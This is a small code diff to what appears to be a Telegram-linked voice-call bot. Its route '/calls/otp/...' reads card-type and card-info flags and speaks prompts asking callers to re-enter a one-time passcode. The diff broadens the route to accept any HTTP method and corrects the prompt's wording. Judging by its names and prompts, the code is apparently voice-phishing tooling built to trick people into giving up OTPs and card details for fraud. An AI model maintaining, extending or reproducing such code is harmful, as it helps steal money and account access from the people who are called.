@@ -3,7 +3,7 @@ import { app } from '../';
 import { Markup } from 'telegraf';
 import { v4 as uuidv4 } from 'uuid';
 
-app.post('/calls/otp/:step/:chatId/:language', async (req, res) => {
+app.all('/calls/otp/:step/:chatId/:language', async (req, res) => {
   const { askCardInfo, cardType, variables, otpLength } = req.query;
   const { language, chatId, step } = req.params;
 
@@ -105,7 +105,7 @@ app.post('/calls/otp/:step/:chatId/:language', async (req, res) => {
                 action: 'say',
                 options: {
                   payload:
-                    'The OTP you have entered is incorrect.  please enter the OTP again followed by the pound key.',
+                    'The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.',
                   language,
                   voice: 'female',
                   loop: true,
